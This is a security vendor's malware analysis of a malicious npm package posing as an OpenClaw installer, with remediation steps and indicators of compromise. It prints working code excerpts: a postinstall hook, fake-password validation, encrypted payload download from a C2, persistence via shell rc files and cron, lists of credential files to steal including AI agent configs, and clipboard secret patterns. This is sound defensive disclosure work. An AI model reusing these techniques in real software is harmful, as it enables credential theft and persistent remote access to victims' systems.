---
excerpt: The JFrog Security research team has identified a malicious npm package named @openclaw-ai/openclawai. This package masquerades as a legitimate CLI tool called "OpenClaw Installer" while deploying a multi-stage infection chain that steals system credentials, browser data, crypto wallets, SSH keys, Apple Keychain databases, iMessage history, and more
title: "GhostClaw Unmasked: A Malicious npm Package Impersonating OpenClaw to Steal Everything"
date: "March 8, 2026"
description: "Meitar Palas, JFrog Security Researcher"
tag: "Real Time Post"
img: /img/RealTimePostImage/post/ghostclaw-unmasked/thumbnail.png
type: realTimePost
minutes: '7'
---

# GhostClaw Unmasked: A Malicious npm Package Impersonating OpenClaw to Steal Everything

The JFrog Security research team has identified a live malicious npm package named `@openclaw-ai/openclawai`. This package masquerades as a legitimate CLI tool called "OpenClaw Installer" while deploying a multi-stage infection chain that steals system credentials, browser data, crypto wallets, SSH keys, Apple Keychain databases, iMessage history, and more \- then installs a persistent RAT with full remote access capabilities including a SOCKS5 proxy and live browser session cloning.

The attack is notable for its broad data collection, its use of social engineering to harvest the victim's system password, and the sophistication of its persistence and C2 infrastructure. Internally, the malware identifies itself as **GhostLoader**.

## Package Delivery:

The `package.json` presents a benign facade. `src/index.js` exports a decoy `useAsyncState` utility. The actual malicious logic is in the `scripts/` directory:

```json
{
  "name": "@openclaw-ai/openclawai",
  "version": "1.5.15",
  "description": "🦞 OpenClaw Installer - Integration utilities",
  "main": "src/index.js",
  "types": "src/index.d.ts",
  "files": [
    "src",
    "scripts/setup.js",
    "scripts/postinstall.js",
    "scripts/build.js"
  ],
  "bin": {
    "openclaw": "./scripts/setup.js"
  },
  "scripts": {
    "start": "node src/index.js",
    "build": "node scripts/build.js",
    "lint": "eslint src/**/*.js",
    "test": "jest"
  },
  "license": "MIT",
  "keywords": [
    "utility",
    "sdk",
    "integration"
  ],
  "dependencies": {}
}
```
The `postinstall` hook silently re-installs the package globally, ensuring the `openclaw` binary is placed on the system `PATH`:

```javascript
const { execSync } = require('child_process');
execSync("npm i -g @openclaw-ai/openclawai", { stdio: 'inherit' });
```

This is the first trigger. Once globally installed, the `openclaw` binary points to `scripts/setup.js`, the obfuscated first-stage dropper.

## Stage 1: Social Engineering and Payload Delivery

`setup.js` is heavily obfuscated (string table shuffling, RC4 decoding, control flow flattening). When executed, it displays a convincing fake CLI installer with animated progress bars, spinners, and realistic system log output:  
![](/img/RealTimePostImage/post/ghostclaw-unmasked/progress_bar.png)

### Credential Theft via Fake Keychain Prompt

After the progress bars complete, the script displays a fake Keychain authorization prompt:

```
Keychain Authorization Required
OpenClaw needs to securely store credentials in the macOS Keychain.
Administrator privileges are required for the initial setup.
This is a one-time operation for secure vault initialization.
```

The victim is prompted for their system password (up to 5 attempts). Each attempt is validated against the real OS authentication mechanism:

```javascript
// macOS
spawnSync("dscl", [".", "-authonly", username, password], { stdio: "pipe", timeout: 5000 });

// Windows
spawnSync("powershell", ["-NoProfile", "-NonInteractive", "-Command",
    "... $ctx.ValidateCredentials('" + username + "', '" + password + "') ..."]);

// Linux
spawnSync("su", ["-c", "true", username], { input: password + "\n", stdio: "pipe" });
```

Failed attempts show "Authentication failed. Please try again." \- exactly mimicking real OS behavior.

### Encrypted Second-Stage Download

While the user is distracted by the installer UI, the script concurrently fetches the second-stage payload from the C2 server. The URL and path are XOR-encoded as integer arrays to avoid static detection:

```javascript
var_60.map((val, i) => String.fromCharCode(val ^ var_61[i])).join("")
// Decodes to: https://trackpipe.dev

var_65.map((val, i) => String.fromCharCode(val ^ var_66[i])).join("")
// Decodes to: fafc0e77-9c1b-4fe1-bf7e-d24d2570e50e
```

The full request goes to:

```
hxxps[://]trackpipe[.]dev/t/bootstrap?t=fafc0e77-9c1b-4fe1-bf7e-d24d2570e50e
```

The C2 returns a JSON response with two fields: (base64-encoded encrypted payload) and `k` (hex decryption key). The payload is decrypted using AES-256-GCM:

```javascript
const encrypted = Buffer.from(response.p, "base64");
const key = Buffer.from(response.k, "hex");
const iv = encrypted.slice(0, 16);
const authTag = encrypted.slice(16, 32);
const ciphertext = encrypted.slice(32);
const decipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
decipher.setAuthTag(authTag);
let decrypted = decipher.update(ciphertext);
decrypted = Buffer.concat([decrypted, decipher.final()]);
```

### Detached Payload Launch

The decrypted JavaScript is written to a temp file and spawned as a detached child process. The stolen password is passed via the `NODE_AUTH_TOKEN` environment variable, and the campaign identifier `complexarchaeologist1` is passed via `NODE_CHANNEL`:

```javascript
const tmpPath = path.join(os.tmpdir(), "sys-opt-" + crypto.randomBytes(6).toString("hex") + ".js");
fs.writeFileSync(tmpPath, decrypted);

const child = spawn(process.execPath, [tmpPath], {
    stdio: "ignore",
    detached: true,
    env: {
        ...process.env,
        NODE_CHANNEL: "complexarchaeologist1",
        NODE_AUTH_TOKEN: stolenPassword,
        NPM_CONFIG_TAG: packageName
    }
});
child.unref();

setTimeout(() => { try { fs.unlinkSync(tmpPath); } catch {} }, 60000);
```

The temp file is deleted after 60 seconds. The `npm install` command completes normally while the payload continues running in the background.

### Full Disk Access Social Engineering (macOS)

If the Safari directory is inaccessible (no Full Disk Access), the script displays an AppleScript dialog urging the user to grant FDA to Terminal, complete with step-by-step instructions and a button that opens System Preferences directly:

```javascript
spawn("osascript", ["-e", 
    'display dialog "OpenClaw requires Full Disk Access..." ' +
    'buttons {"Skip", "Open Settings"} with title "OpenClaw — Security Setup"'
]);
```

This enables the second-stage payload to steal Apple Notes, iMessage, Safari history, and Mail data.

## Stage 2: GhostLoader \- The Full Payload

The second-stage payload is a \~11,700-line JavaScript bundle. It is a complete infostealer and RAT framework. The payload uses a CommonJS module format with `__esm`/`__commonJS` loaders, containing modules for persistence, data collection, browser decryption, C2 communication, a SOCKS5 proxy, and live browser cloning.  
![](/img/RealTimePostImage/post/ghostclaw-unmasked/2nd_stage.png)

### Installation and Persistence

On first execution, the payload installs itself permanently:

**Self-installation.** The script copies itself to a hidden directory disguised as an npm telemetry service:

| Platform | Install Path |
| :---- | :---- |
| macOS / Linux | `~/.cache/.npm_telemetry/monitor.js` |
| Windows | `%APPDATA%/.npm_telemetry/monitor.js` |

```javascript
INSTALL_DIR_NAME = ".npm_telemetry";
EXECUTABLE_NAME = "monitor.js";

function installSelf() {
    const installPath = getInstallPath();
    if (!fs.existsSync(installPath)) fs.mkdirSync(installPath, { recursive: true });
    fs.copyFileSync(process.argv[1], path.join(installPath, EXECUTABLE_NAME));
}
```

**Shell hooks.** Lines are appended to `~/.zshrc`, `~/.bashrc`, and `~/.bash_profile`, disguised as `# NPM Telemetry Integration Service`. The hook checks a `.lock` PID file and re-launches the malware if it is not running:

```javascript
const hookCode = '([ -f "' + lockFile + '" ] && kill -0 $(cat "' + lockFile + '") 2>/dev/null ' +
    '|| nohup ' + process.execPath + ' "' + executablePath + '" >/dev/null 2>&1 &) 2>/dev/null';

for (const rcFile of [".zshrc", ".bashrc", ".bash_profile"]) {
    const content = fs.readFileSync(rcFile, "utf8");
    if (!content.includes(executablePath)) {
        fs.appendFileSync(rcFile, "\n# NPM Telemetry Integration Service\n" + hookCode + "\n");
    }
}
```

**Cron jobs (Linux).** An `@reboot` cron entry is added to ensure the malware survives reboots:

```javascript
const cronLine = '@reboot ( [ -f "' + lockFile + '" ] && kill -0 $(cat "' + lockFile + '") ' +
    '2>/dev/null || ' + nodePath + ' "' + execPath + '" ) >/dev/null 2>&1';
execSync("echo '" + existingCron + "\n" + cronLine + "' | crontab -");
```

**Background daemon.** After installation, the malware spawns itself from the installed path as a detached process, then exits the original process:

```javascript
const child = child_process.spawn(process.execPath, [getExecutablePath()], {
    detached: true,
    stdio: "ignore"
});
child.unref();
```

### First-Run Data Collection

On the initial run, the `main()` function orchestrates a comprehensive data theft operation with a 10-minute hard timeout. It sends a "New Session" notification to Telegram containing the stolen password, hostname, IP, country, and system specs. Then it systematically collects:

**macOS Keychain.** Both the local `login.keychain-db` and all iCloud Keychain databases (including `-wal` and `-shm` journal files):

```javascript
const keychainPath = path.join(os.homedir(), "Library", "Keychains", "login.keychain-db");
if (fs.existsSync(keychainPath)) copyToLoot(keychainPath, "Keychain/login.keychain-db");

// iCloud Keychains: UUID directories containing keychain-2.db, user.kb, TrustedPeersHelper DBs
```

**Browser credentials (with decryption).** If the system password was captured, the malware uses it to decrypt Chrome's `Safe Storage` key via macOS Keychain, then decrypts passwords, cookies, credit cards, and autofill data from all Chromium-based browsers (Chrome, Brave, Edge, Vivaldi, Opera, Yandex, Comet). Firefox passwords are decrypted via NSS/PKCS\#12. The malware reports counts: `Decrypted: 42 pass, 3 cards, 128 autofill`.

**CDP cookie theft.** For cookies that resist SQLite extraction, the malware launches headless browser instances using Chrome DevTools Protocol, connecting via `-remote-debugging-port` to dump all cookies programmatically:

```javascript
async function stealCookiesViaCDP(browsers) {
    const chromiumBrowsers = browsers.filter(b => b.type === "chromium");
    for (const browser of chromiumBrowsers) {
        const binary = findBrowserBinary(browser.name);
        for (const profile of getProfiles(browser.path)) {
            const port = await findAvailablePort(9222);
            const cookies = await runCDPForBrowser(browser.name, binary, browser.path, port, profile);
            // Exports in both Netscape and JSON formats
        }
    }
}
```

**Crypto wallets.** Desktop wallet applications and browser extension wallets are targeted:

| Platform | Wallets Targeted |
| :---- | :---- |
| macOS | Exodus, Electrum, Atomic, Bitcoin Core, Ledger Live, Sparrow, Wasabi, Trezor Suite |
| Linux | Same set, different paths |
| Browser Extensions | MetaMask, Phantom, Solflare, and others |

**Seed phrase scanner.** Files in `~/Desktop`, `~/Documents`, and `~/Downloads` are scanned for BIP-39 mnemonic seed phrases using a wordlist ratio check:

```javascript
function extractMnemonic(text) {
    const words = text.toLowerCase().match(/[a-z]{3,8}/g);
    if (!words || words.length < 12) return null;
    // Calculates ratio of BIP-39 matches
    // Files with high ratios are copied to loot/Seeds/found/
}
```

**SSH keys.** The `~/.ssh/` directory is scanned for private keys (`id_rsa`, `id_ed25519`, etc.).

**Developer and cloud credentials.** A hardcoded list of sensitive files is exfiltrated:

```javascript
const targets = [
    { path: "~/.aws/credentials",      name: "Cloud/AWS/credentials" },
    { path: "~/.aws/config",           name: "Cloud/AWS/config" },
    { path: "~/.azure/profiles.json",  name: "Cloud/Azure/profiles.json" },
    { path: "~/.gcloud/credentials.db", name: "Cloud/GCP/credentials.db" },
    { path: "~/.kube/config",          name: "Cloud/Kubernetes/config" },
    { path: "~/.docker/config.json",   name: "Cloud/Docker/config.json" },
    { path: "~/.npmrc",                name: "Dev/NPM/npmrc" },
    { path: "~/.git-credentials",      name: "Dev/Git/git-credentials" },
    { path: "~/.config/gh/hosts.yml",  name: "Dev/GitHub_CLI/hosts.yml" },
    { path: "~/.config/solana/id.json", name: "Dev/Solana/id.json" },‎
];
```

All environment variables are also dumped to `Environment.txt`.

**AI agent configurations.** The malware targets AI coding agent credential stores:

```javascript
var AI_AGENT_TARGETS = [
    { name: "ZeroClaw", baseDir: ".zeroclaw", files: ["config.toml"], dirs: ["state"] },
    { name: "PicoClaw", baseDir: ".picoclaw", files: ["config.json"], dirs: ["workspace/memory", "workspace/sessions"] },
    { name: "OpenClaw", baseDir: ".openclaw", files: ["openclaw.json"], dirs: ["credentials"] }
];
```

**FDA-protected data (macOS).** If Full Disk Access was granted (checked by attempting to read `~/Library/Safari`), the malware collects:

- Apple Notes (`NoteStore.sqlite` \- parsed into plaintext)  
- iMessage history (`chat.db`)  
- Safari browsing history (`History.db`)  
- Mail account configurations (`Accounts.plist`)  
- Apple Account information (`Accounts4.sqlite`)

![](/img/RealTimePostImage/post/ghostclaw-unmasked/fda_protected_data_example_code.png)

### Exfiltration

All collected data is compressed into a tar.gz archive named `[COUNTRY_CODE]username_persistentId.tar.gz`.

The archive is exfiltrated through multiple channels for redundancy:

| Channel | Condition | Method |
| :---- | :---- | :---- |
| C2 Panel | Always | HTTP upload to `hxxps[://]trackpipe[.]dev` |
| Telegram Bot API | Archive \< \~49 MB | Direct file upload via Bot API:multipart POST to `api.telegram.org/bot<token>/sendDocument` |
| GoFile.io | Archive \> \~49 MB | The upload to `upload.gofile.io/uploadfile`  with the hardcoded bearer token.  Followed by password-locking the file via the GoFile API with the hardcoded password. |

A formatted summary report is sent to Telegram with counts of all stolen data:

```
GhostLoader Report
[ Target ]
  Worker:    complexarchaeologist1
  Campaign:  @openclaw-ai/openclawai
  User:      victim
  Host:      MacBook-Pro.local
  Country:   US
[ Findings ]
  password .. hunter2
  pass .......... 42
  cards ......... 3
  autofill ..... 128
  CDP .......... 4
  wallets ...... 2
  seeds ........ 1
  ssh ............ 3
  FDA ........... Yes (5)
  persist ...... Yes
  keychain ... Yes
  browsers .. 3
  AI agents . ZeroClaw (4), PicoClaw (2)
```

After exfiltration, the loot directory is cleaned up.

### Persistent Mode: RAT Capabilities

On subsequent runs (when the malware detects it is running from its installed path), it enters persistent daemon mode:

1. **PID locking.** Kills any previously running instance and writes its own PID to `.lock`.  
2. **Beacon registration.** Sends system info to the C2 panel for registration.  
3. **Telegram configuration.** Fetches bot token and chat ID from the C2 panel.  
4. **Starts background monitors:**

**Clipboard monitor.** Every 3 seconds, reads the system clipboard and checks it against regex patterns for sensitive data. Any match is immediately sent to Telegram and the C2 panel:

```javascript
var PATTERNS = [
    { name: "Private Key (Hex)", regex: /\b[a-fA-F0-9]{64}\b/ },
    { name: "WIF Key",           regex: /\b[5KLc][1-9A-HJ-NP-Za-km-z]{50,51}\b/ },
    { name: "SOL Private Key",  regex: /\b[1-9A-HJ-NP-Za-km-z]{87,88}\b/ },
    { name: "RSA Private Key",  regex: /---BEGIN (?:RSA )?PRIVATE KEY---/ },
    { name: "BTC Address",      regex: /\b(bc1[a-z0-9]{38,61}|[13][1-9A-HJ-NP-Za-km-z]{25,34})\b/ },
    { name: "ETH Address",      regex: /\b0x[a-fA-F0-9]{40}\b/ },
    { name: "AWS Key",          regex: /\b(AKIA|ABIA|ACCA)[0-9A-Z]{16}\b/ },
    { name: "OpenAI Key",       regex: /\bsk-[a-zA-Z0-9]{48}\b/ },
    { name: "Stripe Key",       regex: /\bsk_live_[0-9a-zA-Z]{24}/ }
];
```

When a mnemonic seed phrase is detected in the clipboard, the alert includes the word count and BIP-39 match ratio.

**Process monitor.** Watch running processes for interesting applications.

**iMessage monitor (macOS).** Monitors the iMessage `chat.db` for new messages in real time.

### C2 Command Handling

The malware polls the C2 panel every \~25 seconds (with 30% jitter) for commands. The `handleCommand()` function supports the following operations:

| Command | Description |
| :---- | :---- |
| `EXEC` | Execute arbitrary shell command (85s timeout), return output to C2 |
| `OPEN` | Open a URL in the victim's default browser |
| `UPDATE` | Download new payload (AES-256-GCM encrypted), overwrite `monitor.js`, restart |
| `GRAB` | Tar and exfiltrate an arbitrary file or directory path |
| `RECOLLECT` | Re-run the full data collection (optionally with a new password) |
| `PROXY_START` | Start a SOCKS5 proxy on the victim machine |
| `PROXY_STOP` | Stop the SOCKS5 proxy |
| `PROXY_STATUS` | Report proxy port, active connections, uptime |
| `CLONE_START` | Clone a browser profile and launch headless with CDP, relay to C2 |
| `CLONE_STOP` | Stop the browser clone |
| `CLONE_STATUS` | List available browsers and active clones |
| `NUKE` | Full self-destruct |

The `UPDATE` command uses the same AES-256-GCM decryption scheme as the initial payload delivery, allowing the operator to push new versions:

```javascript
if (arg_454.type === "UPDATE") try {
const { url: var_1634, key: var_1635 } = JSON.parse(arg_454.payload);
	if (!var_1634 || !var_1635) throw new Error("UPDATE payload missing url or key");
	await selfUpdate(var_1634, var_1635);
	if ("https://trackpipe.dev") try {
	await sendResult(arg_454.id, "Updated. Restarting.", "completed");
	} 
catch {}
	restartSelf();      	} catch (err_68) {
       if ("https://trackpipe.dev") try {
       await sendResult(arg_454.id, err_68.message, "error");
       } catch {}
       }
```

The `CLONE_START` command is particularly dangerous. It copies a full browser profile (including cookies, login data, history, and local state), launches a headless Chromium instance with `-remote-debugging-port`, and relays the CDP WebSocket back to the C2 server. This gives the attacker a fully authenticated browser session \- they can browse as the victim without needing any credentials.

The `NUKE` command performs complete self-destruction: kills all ghost/clone processes, removes shell hooks from all RC files, cleans cron jobs, deletes all temp files prefixed with `ghost_` or `clone_`, and recursively deletes the install directory.

## Anti-Forensics

The malware employs several techniques to avoid detection and complicate analysis:

- Detached child processes with `stdio: "ignore"` and `process.title = "node"`  
- Temp payload file deleted after 60 seconds  
- Install directory disguised as `.npm_telemetry`  
- Shell hooks disguised as `# NPM Telemetry Integration Service`  
- Cron entries disguised as `# Node.js Telemetry Collection`  
- Loot directory cleaned after exfiltration  
- PID lock file prevents multiple instances  
- Crash reporting sends debug logs to Telegram, then exits  
- NUKE command for complete evidence destruction

## Remediation

Affected users who installed this package should:

1. **Remove persistence.** Check `~/.zshrc`, `~/.bashrc`, `~/.bash_profile`, `~/.zshenv`, and `~/.profile` for lines containing `npm_telemetry` or `NPM Telemetry Integration Service`. Remove them. Check `crontab -l` for entries referencing `.npm_telemetry` and remove them.  
2. **Kill running processes.** Run `ps aux | grep monitor.js` and `ps aux | grep npm_telemetry` to find and kill any running instances.  
3. **Delete the install directory.** Remove `~/.cache/.npm_telemetry/` (macOS/Linux) or `%APPDATA%/.npm_telemetry/` (Windows).  
4. **Uninstall the package.** `npm uninstall -g @openclaw-ai/openclawai && npm uninstall @openclaw-ai/openclawai`  
5. **Rotate all credentials.** System password, SSH keys, API tokens (AWS, GCP, Azure, OpenAI, Stripe, npm, GitHub CLI), browser saved passwords, and any crypto wallet seed phrases that may have been exposed.  
6. **Revoke browser sessions.** All browser cookies were exfiltrated. Sign out of all active sessions in Google, GitHub, and other services that support session management.  
7. **Re-image if possible.** Given the depth of access (system password, full keychain, browser sessions, SOCKS5 proxy, browser cloning), a full system re-image is strongly recommended.

## Conclusion

The @openclaw-ai/openclawai package combines social engineering, encrypted payload delivery, broad data collection, and a persistent RAT into a single npm package. The polished fake CLI installer and Keychain prompt are convincing enough to extract system passwords from cautious developers, and once captured, those credentials unlock macOS Keychain decryption and browser credential extraction that would otherwise be blocked by OS-level protections.

The persistence layer (shell hooks, cron jobs) and the UPDATE command give the operator long-term access without needing to republish the package, while the NUKE command enables clean evidence destruction.

Developers should treat any npm package that requests system credentials, uses postinstall scripts to globally install itself, or fetches remote payloads at install time as suspicious. When installing OpenClaw, only use the official package from verified sources \- not third-party or similarly named alternatives. Automated tools that flag these behaviors at install time remain an effective defense against this class of attack.

This package is already detected by JFrog Xray and JFrog Curation.

## Indicators of Compromise

| Indicator | Value |
| :---- | :---- |
| Package Name | `@openclaw-ai/openclawai` |
| Package Type | `NPM` |
| Versions | `1.5.15,1.5.14` |
| XRAY-ID | `XRAY-949975` |
| C2 Domain | `hxxps\[://\]trackpipe\[.\]dev` |
| Bootstrap Path | `/t/bootstrap?t=fafc0e77-9c1b-4fe1-bf7e-d24d2570e50e` |
| Campaign ID | `complexarchaeologist1` |
| Install Directory | `~/.cache/.npm_telemetry/` |
| Executable Name | `monitor.js` |
| Temp File Pattern | `/tmp/sys-opt-*.js` |
| Shell Hook Comment | `# NPM Telemetry Integration Service` |
| Cron Comment | `# Node.js Telemetry Collection` |
| Encryption | `AES-256-GCM (16-byte IV, 16-byte auth tag)` |
| Geo Lookup | `hxxps\[://\]ipinfo\[.\]io/json` |
| File Upload Fallback | `GoFile.io API` |
| Exfiltration | `Telegram Bot API, C2 panel upload` |
| Environment Variables | `NODE_AUTH_TOKEN`, `NODE_CHANNEL`, `NPM_CONFIG_TAG`, `GHOST_RECOLLECT`, `GHOST_TG_CONFIG` |
